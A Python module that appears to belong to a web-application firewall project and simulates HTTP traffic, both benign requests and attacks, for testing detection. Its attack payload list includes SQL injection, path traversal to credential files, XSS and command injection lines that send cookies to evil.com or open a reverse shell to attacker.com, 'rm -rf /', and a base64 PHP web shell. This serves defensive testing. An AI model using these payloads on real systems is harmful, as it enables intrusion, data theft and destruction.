"""
Real Traffic Simulation System for VARDAx
Generates realistic HTTP traffic patterns for testing and demonstration
"""
import asyncio
import random
import time
import json
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import logging
from faker import Faker
import uuid

logger = logging.getLogger(__name__)
fake = Faker()

@dataclass
class TrafficProfile:
    """Traffic generation profile"""
    name: str
    requests_per_minute: int
    attack_probability: float  # 0.0 to 1.0
    bot_probability: float
    countries: List[str]
    user_agents: List[str]
    endpoints: List[str]

class RealTrafficSimulator:
    """Production-grade traffic simulator"""
    
    def __init__(self):
        self.is_running = False
        self.profiles = self._create_traffic_profiles()
        self.attack_payloads = self._load_attack_payloads()
        self.legitimate_patterns = self._load_legitimate_patterns()
        self.ip_pools = self._generate_ip_pools()
        
    def _create_traffic_profiles(self) -> Dict[str, TrafficProfile]:
        """Create realistic traffic profiles"""
        return {
            'normal_business': TrafficProfile(
                name='Normal Business Hours',
                requests_per_minute=150,
                attack_probability=0.02,
                bot_probability=0.15,
                countries=['United States', 'Canada', 'United Kingdom', 'Germany', 'France'],
                user_agents=[
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
                ],
                endpoints=['/api/users', '/api/products', '/api/orders', '/dashboard', '/login', '/search', '/profile']
            ),
            'peak_traffic': TrafficProfile(
                name='Peak Traffic Hours',
                requests_per_minute=400,
                attack_probability=0.05,
                bot_probability=0.25,
                countries=['United States', 'China', 'India', 'Brazil', 'Russia', 'Japan'],
                user_agents=[
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
                ],
                endpoints=['/api/users', '/api/products', '/api/orders', '/api/payments', '/api/search', '/api/recommendations']
            ),
            'night_crawlers': TrafficProfile(
                name='Night Crawlers & Bots',
                requests_per_minute=80,
                attack_probability=0.15,
                bot_probability=0.70,
                countries=['China', 'Russia', 'North Korea', 'Iran', 'Unknown'],
                user_agents=[
                    'python-requests/2.31.0',
                    'curl/7.68.0',
                    'Wget/1.20.3',
                    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                    'sqlmap/1.7.2#stable (http://sqlmap.org)',
                    'Nikto/2.1.6'
                ],
                endpoints=['/admin', '/wp-admin', '/.env', '/config.php', '/api/admin', '/phpmyadmin', '/login']
            ),
            'attack_wave': TrafficProfile(
                name='Coordinated Attack',
                requests_per_minute=800,
                attack_probability=0.85,
                bot_probability=0.95,
                countries=['Unknown', 'China', 'Russia'],
                user_agents=[
                    'python-requests/2.31.0',
                    'curl/7.68.0',
                    '',  # Empty user agent
                    'Mozilla/4.0',  # Suspicious old browser
                    'sqlmap/1.7.2#stable (http://sqlmap.org)'
                ],
                endpoints=['/api/users', '/login', '/admin', '/.env', '/api/admin/users']
            )
        }
    
    def _load_attack_payloads(self) -> Dict[str, List[str]]:
        """Load realistic attack payloads"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT * FROM users--",
                "'; DROP TABLE users; --",
                "' OR 1=1#",
                "admin'--",
                "' OR 'x'='x",
                "1' AND (SELECT COUNT(*) FROM users) > 0--",
                "' UNION SELECT username, password FROM admin--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' OR SLEEP(5)--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
                "<img src='x' onerror='fetch(\"http://evil.com/steal?data=\"+btoa(document.cookie))'>"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "../../../etc/shadow",
                "..\\..\\..\\boot.ini",
                "/etc/passwd%00",
                "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(id)",
                "; rm -rf /",
                "| nc -e /bin/sh attacker.com 4444",
                "; wget http://evil.com/shell.php",
                "$(curl http://evil.com/payload.sh | bash)"
            ],
            'lfi_rfi': [
                "http://evil.com/shell.php",
                "php://input",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                "expect://id",
                "zip://shell.zip#shell.php"
            ]
        }
    
    def _load_legitimate_patterns(self) -> List[Dict[str, Any]]:
        """Load legitimate request patterns"""
        return [
            {'method': 'GET', 'endpoint': '/api/users', 'params': {'page': '1', 'limit': '20'}},
            {'method': 'POST', 'endpoint': '/api/login', 'body': {'username': 'user@example.com', 'password': 'password123'}},
            {'method': 'GET', 'endpoint': '/api/products', 'params': {'category': 'electronics', 'sort': 'price'}},
            {'method': 'POST', 'endpoint': '/api/orders', 'body': {'product_id': '123', 'quantity': 2}},
            {'method': 'GET', 'endpoint': '/dashboard', 'params': {}},
            {'method': 'PUT', 'endpoint': '/api/profile', 'body': {'name': 'John Doe', 'email': 'john@example.com'}},
            {'method': 'GET', 'endpoint': '/api/search', 'params': {'q': 'laptop', 'category': 'electronics'}},
            {'method': 'DELETE', 'endpoint': '/api/cart/items/456', 'params': {}},
            {'method': 'GET', 'endpoint': '/api/notifications', 'params': {'unread': 'true'}},
            {'method': 'POST', 'endpoint': '/api/feedback', 'body': {'rating': 5, 'comment': 'Great service!'}}
        ]
    
    def _generate_ip_pools(self) -> Dict[str, List[str]]:
        """Generate realistic IP address pools by country"""
        return {
            'United States': [f"192.168.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(100)],
            'China': [f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(50)],
            'Russia': [f"172.16.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(30)],
            'Unknown': [f"203.0.113.{random.randint(1,254)}" for _ in range(20)],
            'Brazil': [f"198.51.100.{random.randint(1,254)}" for _ in range(25)],
            'India': [f"203.0.114.{random.randint(1,254)}" for _ in range(40)],
            'Germany': [f"198.51.101.{random.randint(1,254)}" for _ in range(30)],
            'Canada': [f"192.0.2.{random.randint(1,254)}" for _ in range(20)],
            'United Kingdom': [f"198.51.102.{random.randint(1,254)}" for _ in range(25)],
            'France': [f"203.0.115.{random.randint(1,254)}" for _ in range(20)]
        }
    
    def generate_request(self, profile: TrafficProfile) -> Dict[str, Any]:
        """Generate a single realistic HTTP request"""
        # Determine if this is an attack
        is_attack = random.random() < profile.attack_probability
        is_bot = random.random() < profile.bot_probability
        
        # Select country and IP
        country = random.choice(profile.countries)
        client_ip = random.choice(self.ip_pools.get(country, ['127.0.0.1']))
        
        # Select user agent
        user_agent = random.choice(profile.user_agents)
        
        # Generate request details
        if is_attack:
            request = self._generate_attack_request(profile, client_ip, user_agent, country)
        else:
            request = self._generate_legitimate_request(profile, client_ip, user_agent, country)
        
        # Add common headers
        request['headers'].update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Add session for legitimate users
        if not is_attack and not is_bot and random.random() < 0.7:
            session_id = str(uuid.uuid4())
            request['headers']['Cookie'] = f'sessionid={session_id}; csrftoken={uuid.uuid4().hex[:16]}'
        
        return request
    
    def _generate_attack_request(self, profile: TrafficProfile, client_ip: str, user_agent: str, country: str) -> Dict[str, Any]:
        """Generate a malicious request"""
        attack_type = random.choice(list(self.attack_payloads.keys()))
        payload = random.choice(self.attack_payloads[attack_type])
        
        endpoint = random.choice(profile.endpoints)
        method = random.choice(['GET', 'POST'])
        
        request = {
            'client_ip': client_ip,
            'method': method,
            'uri': endpoint,
            'query_string': '',
            'headers': {
                'User-Agent': user_agent,
                'Host': 'example.com',
                'Referer': f'http://evil-site.com/attack-{attack_type}'
            },
            'body': '',
            'status_code': random.choice([200, 403, 404, 500]),
            'response_time_ms': random.uniform(100, 2000),
            'response_size': random.randint(500, 5000),
            'country': country,
            'attack_type': attack_type
        }
        
        # Inject payload based on method
        if method == 'GET':
            if '?' in endpoint:
                request['query_string'] = f"param={payload}&id=1"
            else:
                request['uri'] = f"{endpoint}?param={payload}"
        else:
            request['body'] = json.dumps({'data': payload, 'action': 'submit'})
            request['headers']['Content-Type'] = 'application/json'
        
        return request
    
    def _generate_legitimate_request(self, profile: TrafficProfile, client_ip: str, user_agent: str, country: str) -> Dict[str, Any]:
        """Generate a legitimate request"""
        pattern = random.choice(self.legitimate_patterns)
        
        request = {
            'client_ip': client_ip,
            'method': pattern['method'],
            'uri': pattern['endpoint'],
            'query_string': '',
            'headers': {
                'User-Agent': user_agent,
                'Host': 'example.com',
                'Referer': 'https://example.com/'
            },
            'body': '',
            'status_code': random.choice([200, 201, 204]),
            'response_time_ms': random.uniform(50, 500),
            'response_size': random.randint(1000, 10000),
            'country': country
        }
        
        # Add parameters or body
        if 'params' in pattern and pattern['params']:
            params = '&'.join([f"{k}={v}" for k, v in pattern['params'].items()])
            request['query_string'] = params
        
        if 'body' in pattern and pattern['body']:
            request['body'] = json.dumps(pattern['body'])
            request['headers']['Content-Type'] = 'application/json'
        
        return request
    
    async def start_simulation(self, profile_name: str = 'normal_business'):
        """Start traffic simulation with specified profile"""
        if self.is_running:
            logger.warning("Traffic simulation already running")
            return
        
        profile = self.profiles.get(profile_name)
        if not profile:
            logger.error(f"Unknown traffic profile: {profile_name}")
            return
        
        self.is_running = True
        logger.info(f"Starting traffic simulation with profile: {profile.name}")
        
        try:
            while self.is_running:
                # Calculate requests for this interval
                interval_seconds = 60  # 1 minute intervals
                requests_this_interval = profile.requests_per_minute
                
                # Generate requests
                for _ in range(requests_this_interval):
                    if not self.is_running:
                        break
                    
                    request = self.generate_request(profile)
                    
                    # Send to traffic processor (would be done via API in real implementation)
                    # For now, we'll just log it
                    logger.debug(f"Generated request: {request['method']} {request['uri']} from {request['client_ip']}")
                    
                    # Small delay between requests
                    await asyncio.sleep(interval_seconds / requests_this_interval)
                
                logger.info(f"Generated {requests_this_interval} requests in last minute")
                
        except Exception as e:
            logger.error(f"Error in traffic simulation: {e}")
        finally:
            self.is_running = False
            logger.info("Traffic simulation stopped")
    
    def stop_simulation(self):
        """Stop traffic simulation"""
        self.is_running = False
        logger.info("Stopping traffic simulation...")
    
    def get_available_profiles(self) -> List[str]:
        """Get list of available traffic profiles"""
        return list(self.profiles.keys())
    
    def get_profile_info(self, profile_name: str) -> Optional[Dict[str, Any]]:
        """Get information about a traffic profile"""
        profile = self.profiles.get(profile_name)
        if not profile:
            return None
        
        return {
            'name': profile.name,
            'requests_per_minute': profile.requests_per_minute,
            'attack_probability': profile.attack_probability,
            'bot_probability': profile.bot_probability,
            'countries': profile.countries,
            'endpoints': profile.endpoints
        }

# Global traffic simulator instance
traffic_simulator = RealTrafficSimulator()